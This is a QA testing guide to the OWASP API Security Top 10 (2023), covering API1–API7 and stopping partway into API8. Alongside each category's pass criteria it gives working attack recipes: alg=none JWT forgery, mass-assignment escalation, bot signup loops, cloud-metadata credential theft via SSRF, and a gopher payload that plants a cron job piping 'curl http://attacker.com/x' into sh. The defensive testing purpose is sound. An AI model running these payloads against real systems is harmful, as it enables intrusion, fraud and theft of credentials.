# OWASP API Security Top 10 — 2023 Edition

> Reference for QA engineers testing REST, GraphQL, and RPC APIs. Each category below explains the risk, gives realistic attack vectors, concrete `curl`/Postman/Burp recipes, and a "passing" definition you can encode in test plans.

Source: <https://owasp.org/API-Security/editions/2023/en/0x11-t10/>

## Why APIs need their own Top 10

APIs are the front door of modern systems — they expose business logic, data, and integrations directly. Unlike traditional web apps, APIs:

- Carry **less rendered HTML** and more **raw object access**, so authorization (not XSS) becomes the dominant risk surface.
- Are often **discovered by clients** (mobile, SPA, partner) — meaning hidden endpoints are not really hidden.
- Mass-process objects with **JSON/GraphQL** — exposing properties developers forgot to filter.
- Frequently chain to other APIs, inheriting **upstream trust failures**.

If you skim only one section: **API1, API3, and API5 are all authorization failures** and together account for the bulk of real-world API breaches. Test them ruthlessly.

## Quick-reference table

| ID | Title | Core question to ask | Severity driver |
|----|-------|----------------------|-----------------|
| API1:2023 | Broken Object Level Authorization (BOLA) | Can user A read/modify user B's object by changing the ID? | Data exfiltration |
| API2:2023 | Broken Authentication | Can I forge, replay, brute force, or bypass tokens? | Account takeover |
| API3:2023 | Broken Object Property Level Authorization (BOPLA) | Can I read or write fields I am not entitled to? | Privilege escalation, mass-assignment |
| API4:2023 | Unrestricted Resource Consumption | Can I cause CPU/RAM/cost blowups via crafted input or volume? | DoS, billing impact |
| API5:2023 | Broken Function Level Authorization (BFLA) | Can a normal user call admin/internal endpoints? | Privilege escalation |
| API6:2023 | Unrestricted Access to Sensitive Business Flows | Can I automate a flow (signup, purchase, vote) at scale? | Fraud, business abuse |
| API7:2023 | Server Side Request Forgery (SSRF) | Can I make the server fetch URLs I supply? | Cloud metadata theft, internal scan |
| API8:2023 | Security Misconfiguration | Are headers, errors, CORS, defaults safe? | Information disclosure, foothold |
| API9:2023 | Improper Inventory Management | Are old/deprecated/staging endpoints reachable? | Shadow & zombie APIs |
| API10:2023 | Unsafe Consumption of APIs | Do I trust third-party responses without validation? | Injection, SSRF chain, data poisoning |

## Common testing toolkit

| Tool | Use | Notes |
|------|-----|-------|
| **Postman + Newman** | Build manual exploration collections; run them headless in CI | Use environments/variables to swap accounts |
| **Burp Suite** (Community/Pro) | Intercept, repeat, fuzz with Intruder; Pro for active scan | Match-and-replace rules to swap auth tokens |
| **OWASP ZAP API scan** | Automated scan from OpenAPI/Swagger or Postman collection | `zap-api-scan.py -t openapi.json -f openapi` |
| **curl / httpie / Insomnia** | Repro single requests in tickets and CI | Canonical for bug reports |
| **jwt_tool** | Decode, tamper, re-sign, alg=none, kid injection | <https://github.com/ticarpi/jwt_tool> |
| **Karate / RestAssured** | Authorization regression tests in JVM stacks | Excellent for BOLA grids |
| **Custom Node/Python scripts** | Object-id sweeps, business-flow automation, fuzzers | When tools cannot express your business rules |
| **ffuf / wfuzz** | Endpoint discovery, parameter fuzzing | Pair with wordlists like SecLists `api/` |
| **kiterunner** | Content-discovery aware of API routes | <https://github.com/assetnote/kiterunner> |
| **Arjun** | Hidden parameter discovery | Useful for BOPLA mass-assignment hunts |

---

## API1:2023 — Broken Object Level Authorization (BOLA)

### Definition

The server exposes endpoints that take an object identifier (`/orders/{id}`, `/users/{uuid}`, GraphQL `node(id:)`), and fails to verify the **caller is allowed to access THAT specific object**. Authentication may be perfect; the missing check is "does this token's principal own / share / have a role on this object?".

This is the #1 API risk for a reason: every CRUD endpoint is a potential BOLA. Sequential or guessable IDs make it trivial; UUIDs only delay discovery — they do not fix the bug.

### Common attack vectors

1. **Direct ID swap** — replace `/api/users/me` with `/api/users/42`.
2. **Sequential enumeration** — `/api/invoices/1001`, `1002`, `1003`...
3. **UUID leakage then replay** — UUIDs disclosed via list endpoints, search, public profile pages, or other accounts' webhooks.
4. **Hidden second-order IDs** — `/api/orders/{id}/items/{itemId}` where `itemId` is checked but `id` is not.
5. **GraphQL `node(id:)` queries** — global IDs encode type+id; trying other IDs returns objects.
6. **Verb tunneling** — read may be checked but `PUT`/`DELETE` is not.
7. **Bulk endpoints** — `POST /api/users/bulk` with an array of foreign IDs returns them all.
8. **Tenant boundary breaks** — multi-tenant SaaS where `X-Tenant-Id` header is trusted from the client.

### How to test

**Manual (mandatory):**

1. Authenticate as **two distinct users** (User A, User B), both non-admin.
2. As User A, list your own resources to learn ID shape (`/api/orders` → `[1, 2, 3]`).
3. As User A, hit User B's resources directly: `GET /api/orders/<B-id>`. Repeat for every verb (`GET`, `PUT`, `PATCH`, `DELETE`).
4. Repeat the matrix for **every nested resource** and every **role pair** (user vs. admin, tenant1 vs. tenant2).
5. Try **unauthenticated** access too — sometimes auth is enforced inconsistently.

**Automated:**

- Postman collection where every request is duplicated with `{{tokenA}}` and `{{tokenB}}`. Use `pm.test` to assert B's token returns `403`/`404` for A's resources.
- Custom script that loops object IDs in a known range and records HTTP status + response size.
- Burp Autorize extension — replays every request with a second session and flags mismatches.

### Tools

- **Postman + Newman** — BOLA grids in CI.
- **Burp Suite + Autorize extension** — authorization differential testing.
- **ZAP API scan** with multiple contexts (one per user) for differential checks.
- **Custom Node/Python** — when ID enumeration needs business knowledge.
- **Karate** — declarative authorization regression suites.

### Example requests / payloads

Sequential ID sweep with curl + jq, recording status:

```bash
TOKEN_A="eyJhbGciOi...<userA>"
for id in $(seq 1000 1100); do
  code=$(curl -s -o /tmp/r.json -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "https://api.example.com/v1/invoices/$id")
  size=$(stat -f%z /tmp/r.json 2>/dev/null || stat -c%s /tmp/r.json)
  echo "$id $code $size"
done | tee bola-sweep.txt
```

Postman test snippet — assert User B cannot read User A's order:

```javascript
pm.test("BOLA: user B forbidden on user A order", function () {
  pm.expect(pm.response.code).to.be.oneOf([403, 404]);
  // 404 is acceptable to avoid leaking existence; 200 is a fail
  pm.expect(pm.response.code).to.not.eql(200);
});
```

GraphQL global ID swap:

```graphql
# Authenticated as user B, fetch a node owned by A
query {
  node(id: "T3JkZXI6MTAwMQ==") {  # base64("Order:1001")
    ... on Order {
      id
      total
      customer { email }
    }
  }
}
```

Bulk endpoint abuse:

```bash
curl -X POST https://api.example.com/v1/users/bulk \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"ids":[1,2,3,4,5,6,7,8,9,10,42,99,100]}'
```

Tenant header tampering:

```bash
curl -H "Authorization: Bearer $TOKEN_TENANT_1" \
     -H "X-Tenant-Id: 2" \
     https://api.example.com/v1/customers
```

### What "passing" looks like

- Every endpoint that takes an ID enforces ownership/role on the **server** (never trusts URL, body, or header alone).
- Cross-tenant requests return `403` (or `404` if you intentionally hide existence).
- Authorization regression tests run in CI and fail the build on any new endpoint without a BOLA test.
- IDs alone are never the security boundary — UUIDs help against scraping, not against intentional swap.

### Mapping

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control
- Web Top 10 2021: A01 Broken Access Control

---

## API2:2023 — Broken Authentication

### Definition

Authentication mechanisms (login, token issuance, password reset, MFA) are implemented incorrectly, allowing attackers to assume other identities permanently or temporarily. Common in APIs because tokens are passed across many surfaces (web, mobile, server-to-server) and lifecycle is hard.

### Common attack vectors

1. **Credential stuffing** against `/login` without rate limiting or anomaly detection.
2. **Weak password policy** + no lockout.
3. **JWT flaws**: `alg=none`, `alg=HS256` when key is the public RSA cert, `kid` SQL/path injection, missing `exp`, missing `aud`, accepting expired tokens.
4. **Refresh token rotation missing** — stolen refresh token works forever.
5. **Password reset tokens**: predictable, long-lived, not single-use, reusable across accounts, leaked in HTTP referer.
6. **Session fixation** in cookie-based APIs.
7. **MFA bypass** by skipping the second step (`/login` returns access token before MFA verification).
8. **OAuth flaws**: open redirect on `redirect_uri`, missing PKCE in public clients, mixing implicit and code flows.
9. **API keys in URL** logged everywhere (proxy logs, browser history).

### How to test

**Manual:**

1. Decode the JWT (`jwt.io` or `jwt_tool -t <token>`); inspect `alg`, `kid`, `exp`, `iss`, `aud`.
2. Try `alg=none`: tamper header to `{"alg":"none","typ":"JWT"}`, drop signature, replay.
3. Try algorithm confusion: re-sign HS256 using the server's RSA public key as the HMAC secret.
4. Replay an expired token; replay after logout.
5. Brute-force login with a small wordlist and watch for rate limiting headers (`Retry-After`, `X-RateLimit-Remaining`).
6. Trigger password reset twice — does the first link still work?
7. Intercept MFA flow — can you call the post-MFA endpoint before MFA?

**Automated:**

- `jwt_tool -M at -t <token> -rh "Authorization: Bearer "` for full attack mode.
- Burp Intruder for credential stuffing on staging-only accounts.
- Custom script: request 1000 password resets and check token entropy.

### Tools

- **jwt_tool** — JWT tampering, alg-confusion, kid injection.
- **Burp Intruder / Turbo Intruder** — high-rate auth fuzzing.
- **Hydra / Patator** — credential stuffing in pen-test labs.
- **Postman** with pre-request scripts for token rotation tests.
- **ZAP** auth scan profiles.

### Example requests / payloads

Decode a JWT (no signature check needed for inspection):

```bash
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

Forge `alg=none` token:

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."
curl -H "Authorization: Bearer $FORGED" https://api.example.com/v1/admin/users
```

Algorithm confusion (HS256 with RSA public key):

```bash
# Pull the server's public key
curl -s https://api.example.com/.well-known/jwks.json | jq .
# Then use jwt_tool's "K" attack
jwt_tool "$JWT" -X k -pk public.pem
```

Credential stuffing detection — Postman test:

```javascript
pm.test("Login enforces rate limiting", function () {
  // After 10 rapid bad attempts, expect 429
  pm.expect(pm.response.code).to.eql(429);
  pm.expect(pm.response.headers.get("Retry-After")).to.exist;
});
```

Password reset token reuse check:

```bash
# Request 1
curl -X POST https://api.example.com/v1/auth/reset -d '{"email":"victim@example.com"}'
# Request 2 — should invalidate the first token
curl -X POST https://api.example.com/v1/auth/reset -d '{"email":"victim@example.com"}'
# Use TOKEN_1 — should be rejected
curl -X POST https://api.example.com/v1/auth/reset/confirm \
  -d '{"token":"'$TOKEN_1'","new_password":"hax"}'
```

### What "passing" looks like

- JWTs reject `alg=none`, enforce a single allowed algorithm, validate `exp`, `iss`, `aud`.
- Login is rate-limited per IP and per account; lockout exists or progressive delays.
- Password reset tokens are single-use, short-lived (<= 60 min), high-entropy, bound to user.
- MFA cannot be skipped by replaying intermediate state.
- OAuth uses PKCE for public clients and exact-match `redirect_uri` allow-lists.
- API keys live in headers (never URL), are revocable, and are scoped.

### Mapping

- CWE-287: Improper Authentication
- CWE-798: Hardcoded Credentials
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- Web Top 10 2021: A07 Identification and Authentication Failures

---

## API3:2023 — Broken Object Property Level Authorization (BOPLA)

### Definition

The server authorizes access to the **object** but not to its individual **properties**. Two complementary failures:

- **Excessive data exposure** — `GET /users/{id}` returns the full row including `password_hash`, `mfa_secret`, `internal_notes`.
- **Mass assignment** — `PATCH /users/{id}` accepts `is_admin: true` because the handler binds the whole JSON to the model.

API3:2023 merged the older "Excessive Data Exposure" and "Mass Assignment" categories.

### Common attack vectors

1. **Read-side**: inspect responses for fields no UI uses (`role`, `kyc_status`, `referrer_credit_card`).
2. **GraphQL introspection** revealing fields not in the public schema doc.
3. **Write-side mass assignment**: send extra JSON keys (`is_admin`, `email_verified`, `balance`, `tenant_id`).
4. **Hidden parameter injection** — `Arjun` or wordlist-based discovery of accepted params.
5. **Property substitution** in nested objects: `{"address":{"id":99,"street":"x"}}` to swap to a foreign address row.
6. **PATCH vs PUT semantics** — PATCH may allow partial fields PUT rejects, or vice versa.

### How to test

**Manual:**

1. For every response, list **every field** and ask: "should this client see this?". Compare with the UI.
2. For every write endpoint, replay with **extra keys** matching internal columns (`role`, `is_admin`, `org_id`, `created_by`, `email_verified`, `balance`, `permissions[]`).
3. As a low-priv user, attempt to set fields that should require admin.
4. Use GraphQL introspection (`__schema`) to enumerate full object types, then query non-public fields.

**Automated:**

- Schema-diff: snapshot every endpoint response and alert on new fields.
- Postman pre-request that injects a known set of "dangerous" property names into every PATCH/POST body.
- `Arjun` for hidden param discovery, then replay with values.

### Tools

- **Arjun** — parameter discovery.
- **Burp Param Miner** — discovers hidden JSON keys via response-diffing.
- **GraphQL Voyager / InQL** — schema visualization for introspection.
- **Custom diff scripts** — compare API response keys against an allow-list per role.

### Example requests / payloads

Mass-assignment privilege escalation:

```bash
curl -X PATCH https://api.example.com/v1/users/me \
  -H "Authorization: Bearer $TOKEN_USER" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Eve",
    "is_admin": true,
    "role": "ADMIN",
    "email_verified": true,
    "tenant_id": 1,
    "permissions": ["*"],
    "balance": 1000000
  }'
```

GraphQL introspection to find hidden fields:

```graphql
query {
  __type(name: "User") {
    name
    fields {
      name
      type { name kind ofType { name kind } }
    }
  }
}
```

Then query a hidden field once discovered:

```graphql
query {
  user(id: "me") {
    id
    email
    internalRiskScore   # not exposed in UI but accepted by API
    kycDocumentUrl
  }
}
```

Excessive data exposure detection — Postman:

```javascript
const allowedFields = ["id","email","name","createdAt","avatarUrl"];
const body = pm.response.json();
const leaked = Object.keys(body).filter(k => !allowedFields.includes(k));
pm.test("No fields beyond contract", function () {
  pm.expect(leaked, `Leaked: ${leaked.join(",")}`).to.be.empty;
});
```

Hidden parameter discovery:

```bash
arjun -u "https://api.example.com/v1/users/me" \
  --headers "Authorization: Bearer $TOKEN" \
  -m POST --json
```

Property substitution attack:

```bash
curl -X PATCH https://api.example.com/v1/orders/55 \
  -H "Authorization: Bearer $TOKEN_USER" \
  -d '{"shippingAddress":{"id": 9999, "userId": 9999}}'
# If the server links by ID rather than ownership, you just stole someone else's address row
```

### What "passing" looks like

- Responses are explicit DTOs / view models — never raw ORM dumps.
- Write endpoints use **allow-listed** field binders (e.g. DRF `serializer_class`, Pydantic models with `extra="forbid"`, manual mapping in Go).
- Sensitive fields require a separate, role-checked endpoint to mutate (`/users/{id}/role` for role changes).
- GraphQL schema is the public contract; private fields are absent, not just hidden behind directives.
- Schema-diff or contract tests catch new fields before release.

### Mapping

- CWE-213: Exposure of Sensitive Information Due to Incompatible Policies
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes (mass assignment)
- CWE-200: Information Exposure
- Web Top 10 2021: A01 Broken Access Control, A04 Insecure Design

---

## API4:2023 — Unrestricted Resource Consumption

### Definition

Satisfying API requests requires resources: CPU, memory, storage, network, **third-party paid APIs** (SMS, email, payment, AI). Without limits, attackers cause denial of service or run up the bill. APIs are uniquely exposed because they are programmatic by nature — automation is easy.

### Common attack vectors

1. **Large response sizes** — `GET /users?limit=1000000`.
2. **Deeply nested or aliased GraphQL queries** — query depth/complexity bombs.
3. **Pagination missing** — every `list` endpoint returns the entire table.
4. **File uploads** without size or count limits.
5. **Image processing** with attacker-controlled dimensions (`?w=99999&h=99999`).
6. **Regex DoS (ReDoS)** in input validators.
7. **SMS / email blast** via password-reset, signup, OTP endpoints.
8. **Third-party AI/translate** calls billed per token, no rate limit per user.
9. **Unbounded recursion** in graph traversals.

### How to test

**Manual:**

1. Increase `limit`/`page_size`/`first` until response size or latency spikes.
2. Run a GraphQL deep query (`a { a { a { a { ... } } } }`) and a wide alias query.
3. Upload a 100 MB and a 10 GB file; upload 1000 small files in parallel.
4. Trigger SMS/email endpoints in a tight loop with throwaway addresses.
5. Send pathological regex inputs: `aaaaaaaa...!` to fields validated by greedy regex.

**Automated:**

- `k6`, `vegeta`, or `wrk` for sustained load.
- Custom GraphQL complexity probe that escalates depth.
- ZAP add-on "Advanced SQLi/Time-based" for latency oracles that double as DoS detectors.

### Tools

- **k6**, **vegeta**, **wrk**, **artillery** — load generation.
- **GraphQL Cop** — automated GraphQL DoS checks.
- **Burp Intruder** with concurrency tuned high.
- **Custom Python with `aiohttp`** — orchestrate burst attacks against a staging env.

### Example requests / payloads

Pagination abuse:

```bash
curl "https://api.example.com/v1/orders?limit=10000000&offset=0" \
  -H "Authorization: Bearer $TOKEN"
```

GraphQL depth bomb:

```graphql
query Depth {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends { id name }
          }
        }
      }
    }
  }
}
```

GraphQL alias amplification (one expensive field, 1000 times):

```graphql
query Alias {
  a1: search(q:"aaa") { id }
  a2: search(q:"aaa") { id }
  a3: search(q:"aaa") { id }
  # ...repeated to a1000
}
```

ReDoS payload against an email validator using catastrophic backtracking:

```bash
curl -X POST https://api.example.com/v1/subscribe \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}' \
  --max-time 30
# Watch server CPU and response time
```

Cost-amplification via paid third-party (SMS):

```bash
for i in $(seq 1 500); do
  curl -X POST https://api.example.com/v1/auth/otp \
    -d '{"phone":"+10000000'$i'"}' &
done
wait
```

Image bomb upload:

```bash
# Decompression bomb: 10 KB on disk, 4 GB when decoded
curl -X POST https://api.example.com/v1/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@bomb.png"
```

### What "passing" looks like

- Every list endpoint enforces a maximum `limit` and rejects larger values with `400`.
- Per-user, per-IP, and global rate limits exist (e.g. token bucket with `429` + `Retry-After`).
- File uploads have size and MIME-type caps before parsing.
- Image processing rejects dimensions above an explicit ceiling.
- GraphQL has depth + complexity + cost analysis (e.g. `graphql-cost-analysis`, persisted queries in prod).
- All paid third-party calls are gated by per-account quotas.
- Regex inputs are validated with bounded patterns (or use `re2`/`hyperscan`).

### Mapping

- CWE-770: Allocation of Resources Without Limits or Throttling
- CWE-400: Uncontrolled Resource Consumption
- CWE-1333: Inefficient Regular Expression Complexity
- Web Top 10 2021: A04 Insecure Design

---

## API5:2023 — Broken Function Level Authorization (BFLA)

### Definition

The server checks the user is authenticated but does not check the user's **role/group/scope** for the specific function. A regular user calls an admin endpoint and it works, or a read-only user calls write endpoints, or a tenant admin reaches global-admin functions.

### Common attack vectors

1. **Predictable admin paths**: `/admin/...`, `/internal/...`, `/v2/manage/...`.
2. **Verb tampering**: `GET /users/{id}` is allowed; `DELETE /users/{id}` is not checked.
3. **HTTP method override**: `X-HTTP-Method-Override: DELETE` in a `POST`.
4. **Role flag in JWT trusted from the client** when the JWT was minted by a public broker.
5. **Group/scope checks at the gateway only** — the service trusts internal traffic.
6. **Missing checks on internal-only services** exposed by mistake (see API9).
7. **Inconsistent middleware** — the auth decorator is missing on a single new endpoint.

### How to test

**Manual:**

1. Map all roles in the system (anonymous, user, support, tenant-admin, global-admin).
2. Build the **role x endpoint matrix** — every cell is a test case.
3. As the lowest-priv user, hit every endpoint and every verb.
4. Try common admin path variants: `/admin/users`, `/api/admin/users`, `/api/v1/admin/users`, `/api/internal/users`, `/api/v2/users` (newer version with weaker checks).
5. Replay a captured admin request with a non-admin token.
6. Try method override headers: `X-HTTP-Method-Override`, `X-Method`, `_method`.

**Automated:**

- Burp Autorize with two sessions (low-priv and admin).
- Karate role tests:

```yaml
Feature: BFLA matrix
  Scenario Outline: <role> on <method> <path>
    Given url baseUrl + '<path>'
    And header Authorization = 'Bearer ' + tokens['<role>']
    When method <method>
    Then status <expected>
  Examples:
    | role  | method | path             | expected |
    | user  | DELETE | /v1/users/2      | 403      |
    | user  | POST   | /v1/admin/audit  | 403      |
    | admin | DELETE | /v1/users/2      | 200      |
```

### Tools

- **Burp Autorize**, **AuthMatrix** extension.
- **ZAP** with multiple authenticated contexts.
- **Karate**, **RestAssured**, **pytest** parametrized tests for role x endpoint grids.
- **kiterunner** to discover hidden admin routes.

### Example requests / payloads

Admin endpoint with user token:

```bash
curl -X POST https://api.example.com/v1/admin/users \
  -H "Authorization: Bearer $TOKEN_USER" \
  -H "Content-Type: application/json" \
  -d '{"email":"eve@example.com","role":"admin"}'
# Expected: 403. Bug if 200/201.
```

Verb tampering:

```bash
# DELETE not checked
curl -X DELETE https://api.example.com/v1/posts/123 \
  -H "Authorization: Bearer $TOKEN_USER"
```

Method override:

```bash
curl -X POST https://api.example.com/v1/posts/123 \
  -H "Authorization: Bearer $TOKEN_USER" \
  -H "X-HTTP-Method-Override: DELETE"
```

Hidden admin route discovery:

```bash
ffuf -u https://api.example.com/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer $TOKEN_USER" \
  -mc 200,201,204,301,302,403 \
  -fs 0
```

### What "passing" looks like

- Every endpoint declares its required role/scope/permission, ideally in a single shared decorator/middleware.
- A central authorization matrix exists (data-driven), with tests that fail when a new endpoint is added without an entry.
- Admin/internal endpoints reject method override headers.
- Different versions (`/v1`, `/v2`) re-apply checks; older versions are not silently more permissive.
- Default-deny: an endpoint without an explicit role rule returns `403`.

### Mapping

- CWE-285: Improper Authorization
- CWE-862: Missing Authorization
- Web Top 10 2021: A01 Broken Access Control

---

## API6:2023 — Unrestricted Access to Sensitive Business Flows

### Definition

A flow is technically authorized for the user, but the **rate or pattern** of usage harms the business: bulk signups creating fake accounts, automated checkout draining limited inventory ("sneaker bots"), bulk vote/like manipulation, mass referral redemption, scraping at scale, comment/review spam.

This is not a classic CIA breach — it is an **abuse-of-functionality** risk. QA teams often miss it because each call individually passes.

### Common attack vectors

1. **Account creation** — automated signup with disposable emails to farm referral credit.
2. **Inventory hoarding** — script adds limited items to cart faster than humans can.
3. **Coupon stacking / promo abuse** — replay redemption endpoint.
4. **Voting / rating** — bot networks inflating ratings.
5. **Comment / message spam** — fast posting to flood channels.
6. **Scraping** — pulling all listings/products at machine speed.
7. **Reward farming** — auto-completing tasks that grant points.

### How to test

**Manual:**

1. Identify **sensitive flows** with the product/business team: signup, checkout, redeem, vote, post.
2. For each flow, ask: "if 1000 bots ran this in parallel for 1 hour, what damage occurs?".
3. Attempt to automate the flow with a script and observe whether bot defenses trigger (CAPTCHA, anomaly score, hold queue).
4. Try to bypass defenses (CAPTCHA solver in test, header rotation, residential proxy in lab).

**Automated:**

- k6/vegeta scripts replaying the flow at production-like scale on staging.
- Postman collections that walk the flow then assert anti-abuse signals appear.

### Tools

- **k6**, **Locust** — flow replay at scale.
- **Headless browsers** (Playwright/Puppeteer) — when the flow has client-side challenges.
- **Custom scripts** — necessary because each flow is business-specific.
- **Bot management vendors** for production (DataDome, hCaptcha Enterprise, Akamai Bot Manager) — verify their integration in QA.

### Example requests / payloads

Mass signup farm:

```bash
for i in $(seq 1 5000); do
  curl -s -X POST https://api.example.com/v1/auth/signup \
    -H "Content-Type: application/json" \
    -d '{"email":"bot'$i'@mailinator.com","password":"P@ss'$i'!","referral":"FRIEND2024"}' &
  if (( i % 50 == 0 )); then wait; fi
done
```

Coupon replay:

```bash
COUPON="SUMMER50"
for i in $(seq 1 100); do
  curl -X POST https://api.example.com/v1/cart/coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"'$COUPON'"}'
done
# Expected after first redemption: 409 / "already used"
```

Inventory grab (Postman pre-request snippet):

```javascript
// 50 parallel POSTs to add a limited-edition SKU to cart
const url = "https://api.example.com/v1/cart/items";
const body = JSON.stringify({sku:"LIMITED-001", qty:1});
for (let i = 0; i < 50; i++) {
  pm.sendRequest({
    url, method:"POST",
    header:{"Authorization":"Bearer "+pm.environment.get("token"),
            "Content-Type":"application/json"},
    body:{mode:"raw", raw:body}
  }, () => {});
}
```

### What "passing" looks like

- Sensitive flows have **per-account, per-IP, and per-device rate limits** in addition to global ones.
- CAPTCHA / bot challenge / device attestation triggers on suspicious velocity.
- Coupon and referral codes are single-use, single-account, with anti-fraud checks.
- Inventory holds are short and per-account-bounded.
- Disposable email domains and suspicious IP reputation feeds are factored in for high-value flows.
- Business owns a list of sensitive flows; security and QA test them as first-class scenarios.

### Mapping

- CWE-840: Business Logic Errors
- CWE-799: Improper Control of Interaction Frequency
- Web Top 10 2021: A04 Insecure Design

---

## API7:2023 — Server Side Request Forgery (SSRF)

### Definition

The API fetches a remote resource based on a URL/host the client supplies, without sufficient validation. Attackers point the server at:

- **Cloud metadata services** (AWS/GCP/Azure) to steal IAM credentials.
- **Internal-only services** (admin consoles, databases) reachable from the API host but not from the internet.
- **Localhost / loopback** services (Redis, Elasticsearch, internal HTTP).
- **File schemes** (`file://`, `gopher://`, `dict://`) for arbitrary file read or protocol smuggling.

### Common attack vectors

1. **Direct URL parameter** — `POST /webhook { "url": "http://attacker..." }`.
2. **Image/avatar fetcher** — `POST /profile { "avatarUrl": "..." }`.
3. **PDF/HTML rendering** — server-side renderers that follow links.
4. **OAuth `redirect_uri` and `jwks_uri`** in identity flows.
5. **Webhooks** — outbound HTTP to attacker host.
6. **DNS rebinding** — domain resolves public initially, then to `127.0.0.1` after validation.
7. **URL parser confusion** — `http://evil.com#@127.0.0.1/` style tricks.
8. **Open redirects chained** to bypass allow-lists.

### How to test

**Manual:**

1. List every endpoint that takes a URL, host, or external-resource identifier.
2. Point each at a server you control and verify the request lands.
3. Then point at cloud metadata, internal IPs, and localhost — check responses, timing, and error messages.
4. Try schemes: `http`, `https`, `file`, `gopher`, `dict`, `ftp`, `ldap`.
5. Try parser tricks: `@`, `#`, IP encodings (decimal, octal, IPv6 mapped).
6. Try DNS rebinding using a service like `rbndr.us` or your own.

**Automated:**

- Burp Collaborator — out-of-band detection.
- ZAP active scan — built-in SSRF rules.
- Custom payload list with cloud metadata variants.

### Tools

- **Burp Collaborator** — OOB DNS/HTTP capture.
- **interactsh** (Project Discovery) — open-source Collaborator.
- **SSRFmap** — automation against parameter-based SSRF.
- **Gopherus** — generate `gopher://` payloads to talk to Redis, MySQL, SMTP.

### Example requests / payloads

AWS IMDSv1 (still common in older instances):

```bash
curl -X POST https://api.example.com/v1/webhook/test \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

AWS IMDSv2 — requires PUT to get token, often blocks naive SSRF, but worth attempting:

```bash
# If the SSRF can chain a PUT
curl -X POST https://api.example.com/v1/fetch \
  -d '{"url":"http://169.254.169.254/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}'
```

GCP metadata (requires `Metadata-Flavor: Google` header — try if SSRF allows headers):

```bash
curl -X POST https://api.example.com/v1/fetch \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token","headers":{"Metadata-Flavor":"Google"}}'
```

Azure IMDS (requires `Metadata: true`):

```bash
curl -X POST https://api.example.com/v1/fetch \
  -d '{"url":"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/","headers":{"Metadata":"true"}}'
```

DigitalOcean / Oracle / Alibaba metadata IPs (worth keeping in payload list):

- DigitalOcean: `http://169.254.169.254/metadata/v1/`
- Oracle Cloud: `http://169.254.169.254/opc/v2/instance/`
- Alibaba: `http://100.100.100.200/latest/meta-data/`

Localhost / internal range probes:

```bash
for host in 127.0.0.1 localhost 0.0.0.0 [::1] 10.0.0.1 192.168.1.1; do
  for port in 22 80 443 6379 9200 5432 3306 8080 8500; do
    curl -s -o /dev/null -w "$host:$port %{http_code} %{time_total}\n" \
      -X POST https://api.example.com/v1/fetch \
      -d "{\"url\":\"http://$host:$port/\"}"
  done
done
```

URL parser bypass payloads to try:

```text
http://evil.com#@127.0.0.1/
http://127.0.0.1.nip.io/
http://2130706433/                  # decimal for 127.0.0.1
http://017700000001/                # octal
http://[::ffff:127.0.0.1]/
http://attacker.com\@127.0.0.1/
http://attacker.com:80@127.0.0.1/
http://localhost%23.attacker.com/
```

Gopher to internal Redis (if `gopher://` allowed):

```text
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0d%0a*/1 * * * * curl http://attacker.com/x|sh%0d%0a%0d%0a
```

### What "passing" looks like

- URL inputs are **validated against an allow-list of hosts** (not a deny-list).
- DNS is resolved once, the IP checked against private/loopback/metadata ranges, then the connection is made to **that exact IP** (defeats DNS rebinding).
- IMDSv2 is enforced on AWS instances; metadata responses are unreachable from app code paths.
- Only `http`/`https` schemes accepted; redirects are followed at most once and re-validated.
- Outbound traffic from API hosts is restricted by an egress proxy or VPC firewall.
- Errors do not leak response bodies, status codes, or timing for blocked URLs.

### Mapping

- CWE-918: Server-Side Request Forgery
- Web Top 10 2021: A10 Server-Side Request Forgery

---

## API8:2023 — Security Misconfiguration

### Definition

The API stack — application, framework, server, container, cloud — is not hardened. Defaults are insecure, debug endpoints leak, headers are missing, CORS is wildcard, errors are verbose, TLS is weak, secrets sit in environment dumps.

### Common attack vectors

1. **Verbose stack traces** in production responses.
2. **Open CORS** — `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` (browser blocks this combo, but the misconfig is a smell).
3. **Reflected origin** — `ACAO` echoes any `Origin` header.
4. **Missing security headers**: HSTS, CSP, X-Content-Type-Options, X-Frame-Options.
5. **Default credentials** on admin tools (Kibana, RabbitMQ, Jenkins, Actuator).
6. **Spring Boot Actuator** endpoints (`/actuator/env`, `/actuator/heapdump`) reachable.
7. **Directory listing** on `/swagger`, `/static`.
8. **Outdated TLS** (1.0/1.1) or weak ciphers.
9. **Cloud bucket** misconfigurations exposing logs and backups.
10. **Unnecessary HTTP methods** (`TRACE`, `OPTIONS` returning sensitive info).

### How to test

**Manual:**

1. Curl with `-v` and inspect headers — check HSTS, CSP, COOP/COEP, X-Content-Type-Options.
2. Trigger a deliberate error (`/users/abc` when ID is numeric) and read the response body.
3. Send `Origin: https://evil.com` and inspect `Access-Control-Allow-Origin` and `-Credentials`.
4. Probe well-known framework paths: `/actuator/*`, `/_debug`, `/api-docs`, `/swagger-ui.html`, `/.env`, `/console`.
